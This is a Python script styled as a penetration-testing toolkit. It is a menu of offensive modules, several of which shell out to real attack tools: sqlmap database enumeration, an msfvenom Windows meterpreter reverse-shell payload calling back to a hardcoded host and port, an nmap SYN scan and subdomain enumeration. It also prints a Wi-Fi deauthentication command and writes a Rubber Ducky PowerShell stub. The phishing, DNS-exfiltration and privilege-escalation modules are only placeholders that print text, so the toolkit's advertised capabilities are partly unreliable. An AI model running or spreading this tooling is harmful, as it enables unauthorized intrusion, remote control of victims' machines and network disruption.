import os
import subprocess
import requests
import threading
from urllib.parse import urlencode

# Global Settings
TARGET_URL = "http://example.com"  # Replace with the actual target
HEADERS = {"User-Agent": "Mozilla/5.0"}
SESSION = requests.Session()


# Utility Functions
def install_dependencies():
    print("[+] Installing required dependencies...")
    dependencies = [
        "requests", "beautifulsoup4", "sublist3r", "shodan"
    ]
    for dep in dependencies:
        subprocess.run(["pip3", "install", dep], check=True)
    print("[+] Dependencies installed.\n")


# Module 1: Phishing Campaigns
def phishing_email_campaign():
    print("[+] Initiating Phishing Campaign...")
    # Implementation for automated phishing email generation and sending
    print("Simulating email dispatch with fake login links (e.g., Google, Microsoft).")


# Module 2: Website Exploitation
def website_exploitation():
    print("[+] Testing Website for Vulnerabilities...")
    sqlmap_path = "sqlmap"  # Ensure sqlmap is installed and in PATH
    command = f"{sqlmap_path} -u {TARGET_URL} --batch --dbs"
    os.system(command)


# Module 3: Payload Delivery
def generate_payload():
    print("[+] Generating Payload...")
    payload_command = (
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 "
        "-f exe -o payload.exe"
    )
    os.system(payload_command)
    print("Payload generated as 'payload.exe'.")


# Module 4: Network Attacks
def wifi_deauth():
    print("[+] Simulating Wi-Fi Deauthentication Attack...")
    deauth_command = "aireplay-ng --deauth 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0"
    print(f"Execute: {deauth_command}")


# Module 5: Malicious USB Payloads
def create_malicious_usb():
    print("[+] Creating Malicious USB Payload...")
    rubber_ducky_payload = (
        "REM Sample Rubber Ducky payload\nDELAY 1000\nSTRING cmd /c powershell"
    )
    with open("usb_payload.txt", "w") as file:
        file.write(rubber_ducky_payload)
    print("[+] USB Payload saved as 'usb_payload.txt'.")


# Module 6: Social Media Recon
def social_media_scraping():
    print("[+] Scraping Social Media Profiles...")
    profiles = ["https://facebook.com/example", "https://twitter.com/example"]
    for profile in profiles:
        print(f"Scraping profile: {profile}")


# Module 7: Vulnerability Scanning
def run_vulnerability_scan():
    print("[+] Running Vulnerability Scanner...")
    nmap_command = "nmap -sS -sV -p 1-1000 -T4 192.168.1.1"
    os.system(nmap_command)


# Module 8: Data Exfiltration
def dns_tunneling():
    print("[+] Initiating DNS Tunneling...")
    print("Placeholder for DNS exfiltration using iodine or dnscat2.")


# Module 9: Local Infrastructure Attacks
def privilege_escalation():
    print("[+] Simulating Privilege Escalation...")
    print("Placeholder for privilege escalation attacks on Linux/Windows.")


# Module 10: Automated Recon
def subdomain_enum():
    print("[+] Enumerating Subdomains...")
    os.system(f"sublist3r -d {TARGET_URL}")


# Snazzy Menu
def show_menu():
    print("""
    ======================================
      Advanced Penetration Testing Toolkit
    ======================================
    [1] Install Dependencies
    [2] Phishing Campaigns
    [3] Website Exploitation (SQL Injection)
    [4] Generate Payload (Reverse Shell)
    [5] Wi-Fi Deauthentication Attack
    [6] Create Malicious USB Payload
    [7] Social Media Recon
    [8] Run Vulnerability Scanner
    [9] Data Exfiltration via DNS
    [10] Privilege Escalation
    [11] Subdomain Enumeration
    [0] Exit
    """)


def main():
    while True:
        show_menu()
        choice = input("Select an option: ")
        if choice == "1":
            install_dependencies()
        elif choice == "2":
            phishing_email_campaign()
        elif choice == "3":
            website_exploitation()
        elif choice == "4":
            generate_payload()
        elif choice == "5":
            wifi_deauth()
        elif choice == "6":
            create_malicious_usb()
        elif choice == "7":
            social_media_scraping()
        elif choice == "8":
            run_vulnerability_scan()
        elif choice == "9":
            dns_tunneling()
        elif choice == "10":
            privilege_escalation()
        elif choice == "11":
            subdomain_enum()
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")


if __name__ == "__main__":
    main()

